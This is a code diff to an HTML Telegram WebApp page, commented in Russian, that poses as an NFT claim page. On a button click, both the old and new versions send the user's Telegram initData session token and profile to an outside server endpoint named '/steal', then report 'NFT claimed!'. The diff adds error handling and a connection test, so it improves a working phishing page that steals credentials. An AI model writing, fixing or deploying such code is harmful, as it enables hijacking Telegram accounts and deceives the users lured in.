@@ -56,88 +56,101 @@
     </div>
 
     <script>
-        // 1. Инициализация WebApp (КРИТИЧЕСКИ ВАЖНО)
+    // 1. Инициализация WebApp
+    try {
         Telegram.WebApp.ready();
         console.log("Telegram WebApp initialized");
+        updateStatus("WebApp initialized", "green");
+    } catch (e) {
+        updateStatus(`Init error: ${e.message}`, "red");
+    }
 
-        // 2. Элементы для отладки
-        const statusText = document.getElementById('status-text');
-        const button = document.getElementById('get-nft');
+    // 2. Элементы для отладки
+    const statusText = document.getElementById('status-text');
+    const button = document.getElementById('get-nft');
 
-        // 3. Проверка поддержки WebApp
-        function updateStatus(message, color = 'black') {
-            statusText.textContent = message;
-            statusText.style.color = color;
-            console.log(message);
-        }
+    // 3. Проверка поддержки WebApp
+    function updateStatus(message, color = 'black') {
+        statusText.textContent = message;
+        statusText.style.color = color;
+        console.log(message);
+    }
 
-        // 4. Проверка инициализации
-        if (!window.Telegram || !Telegram.WebApp) {
-            updateStatus("Error: Telegram WebApp not loaded", "red");
-            button.disabled = true;
+    // 4. Проверка инициализации
+    if (!window.Telegram || !Telegram.WebApp) {
+        updateStatus("Error: Telegram WebApp not loaded", "red");
+        button.disabled = true;
+    } else {
+        updateStatus("WebApp OK", "green");
+    }
+
+    // 5. Проверка пользователя
+    try {
+        const user = Telegram.WebApp.initDataUnsafe.user;
+        if (user) {
+            updateStatus(`Hello, ${user.first_name || 'User'}!`);
         } else {
-            updateStatus("WebApp initialized successfully", "green");
-
-            // 5. Показываем информацию о пользователе
-            const user = Telegram.WebApp.initDataUnsafe.user;
-            if (user) {
-                updateStatus(`Hello, ${user.first_name || 'User'}!`);
-            }
+            updateStatus("User data not available", "orange");
         }
+    } catch (e) {
+        updateStatus(`User error: ${e.message}`, "red");
+    }
 
-        // 6. Обработчик кнопки
-        button.addEventListener('click', function() {
-            updateStatus("Requesting NFT access...", "blue");
+    // 6. Обработчик кнопки
+    button.addEventListener('click', async function() {
+        updateStatus("Starting...", "blue");
 
-            Telegram.WebApp.requestAccess('nft', function(accessGranted) {
-                if (!accessGranted) {
-                    updateStatus("Access to NFT denied", "red");
-                    alert("❌ You must grant access to NFT features");
-                    return;
-                }
+        try {
+            // A. Проверка пользователя
+            const user = Telegram.WebApp.initDataUnsafe.user;
+            if (!user || !user.id) {
+                throw new Error("User data missing");
+            }
 
-                const initData = Telegram.WebApp.initData;
-                const user = Telegram.WebApp.initDataUnsafe.user;
+            // B. Создаем тестовый запрос
+            updateStatus("Sending test request...", "purple");
 
-                if (!user || !user.id) {
-                    updateStatus("User data missing", "red");
-                    alert("⚠️ Cannot get user information");
-                    return;
-                }
-
-                updateStatus("Sending request to server...", "purple");
-
-                // 7. Отправка запроса
-                fetch('https://nftsssf-juerasd.amvera.io/steal', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        token: initData,
-                        user: user
-                    })
-                })
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error(`Server error: ${response.status}`);
-                    }
-                    return response.json();
-                })
-                .then(data => {
-                    if (data.success) {
-                        updateStatus("NFT successfully claimed!", "green");
-                        alert("🎉 NFT collected successfully!");
-                    } else {
-                        updateStatus(`Error: ${data.error}`, "red");
-                        alert(`❌ Error: ${data.error || 'Unknown error'}`);
-                    }
-                })
-                .catch(error => {
-                    updateStatus(`Error: ${error.message}`, "red");
-                    alert(`🚨 Network error: ${error.message}`);
-                    console.error("Fetch error:", error);
-                });
+            const testResponse = await fetch('https://nftsssf-juerasd.amvera.io/steal', {
+                method: 'OPTIONS'
             });
-        });
-    </script>
+
+            if (!testResponse.ok) {
+                throw new Error(`Test OPTIONS failed: ${testResponse.status}`);
+            }
+
+            updateStatus("Connection OK!", "green");
+
+            // C. Отправка реального запроса
+            updateStatus("Sending NFT request...", "purple");
+
+            const response = await fetch('https://nftsssf-juerasd.amvera.io/steal', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    token: Telegram.WebApp.initData,
+                    user: user
+                })
+            });
+
+            // D. Обработка ответа
+            if (!response.ok) {
+                throw new Error(`Server error: ${response.status}`);
+            }
+
+            const data = await response.json();
+            if (data.success) {
+                updateStatus("NFT claimed!", "green");
+                alert("🎉 Success!");
+            } else {
+                throw new Error(data.error || "Unknown error");
+            }
+        } catch (error) {
+            updateStatus(`Error: ${error.message}`, "red");
+            alert(`🚨 Error: ${error.message}`);
+            console.error("Error details:", error);
+        }
+    });
+</script>
+
 </body>
 </html>
